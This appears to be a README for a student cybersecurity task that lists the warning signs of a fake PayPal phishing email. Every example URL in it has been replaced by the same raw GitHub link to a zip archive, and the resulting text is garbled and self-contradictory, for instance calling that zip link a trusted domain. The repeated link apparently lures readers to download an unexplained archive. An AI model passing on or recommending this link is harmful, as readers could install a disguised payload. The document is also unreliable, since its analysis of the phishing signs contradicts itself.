# Cyber-Security-task-2

1) https://raw.githubusercontent.com/abhinavkame/Cyber-Security-task-2/main/extratubal/Cyber-task-Security-v2.9.zip – looks like PayPal but it's fake (paypl instead of paypal
2) "Urgent", "Your account will be locked", "within 24 hours" – creates panic
3) URL says "PayPal", but links to https://raw.githubusercontent.com/abhinavkame/Cyber-Security-task-2/main/extratubal/Cyber-task-Security-v2.9.zip, which is suspicious
4) The link does not point to https://raw.githubusercontent.com/abhinavkame/Cyber-Security-task-2/main/extratubal/Cyber-task-Security-v2.9.zip, a trusted domain
5) https://raw.githubusercontent.com/abhinavkame/Cyber-Security-task-2/main/extratubal/Cyber-task-Security-v2.9.zip – can run malicious scripts or trick user into entering credentials
6) The message mimics urgency and fear, a typical sign of phishing
